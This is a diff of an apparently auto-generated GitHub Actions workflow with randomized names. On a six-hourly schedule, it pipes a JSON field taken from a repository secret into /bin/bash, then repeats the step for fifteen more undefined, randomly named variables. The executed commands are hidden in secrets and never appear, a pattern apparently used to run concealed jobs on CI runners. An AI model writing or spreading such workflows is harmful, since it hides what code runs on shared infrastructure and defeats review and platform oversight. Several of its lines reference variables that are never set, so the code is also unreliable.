@@ -1,9 +1,9 @@
 name: renzonglyh
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 5/6 * * *'
-
+    - cron: '16 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +12,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: renzonglyh
         env:
-          xlvl65266: ${{ secrets.xlvl65266 }}
+          yqd25586: ${{ secrets.yqd25586 }}
         run: |
-          echo $xlvl65266 | jq -r .yddc5109 | /bin/bash
-          echo $goei6464 | jq -r .ykc0 | /bin/bash
-          echo $zsxk0 | jq -r .ta07085 | /bin/bash
-          echo $wwhy913 | jq -r .psng5 | /bin/bash
-          echo $an967 | jq -r .bzlk3 | /bin/bash
+          echo $yqd25586 | jq -r .w4 | /bin/bash
+          echo $wm50 | jq -r .rshmr36 | /bin/bash
+          echo $rouoz92 | jq -r .q0 | /bin/bash
+          echo $dmqne82714 | jq -r .ro966 | /bin/bash
+          echo $an43968 | jq -r .grmwz6194 | /bin/bash
+          echo $wuz27 | jq -r .z867 | /bin/bash
+          echo $f5 | jq -r .nuo86117 | /bin/bash
+          echo $ztrr342 | jq -r .l27 | /bin/bash
+          echo $m39 | jq -r .z2 | /bin/bash
+          echo $wagl0 | jq -r .rtrdv2035 | /bin/bash
+          echo $ms2 | jq -r .i11851 | /bin/bash
+          echo $enlv94 | jq -r .apkwp60 | /bin/bash
+          echo $vo04485 | jq -r .wbt5354 | /bin/bash
+          echo $tsdxk323 | jq -r .hs32 | /bin/bash
+          echo $tqbpi777 | jq -r .qfyse153 | /bin/bash
+          echo $hd0028 | jq -r .inw2528 | /bin/bash
 
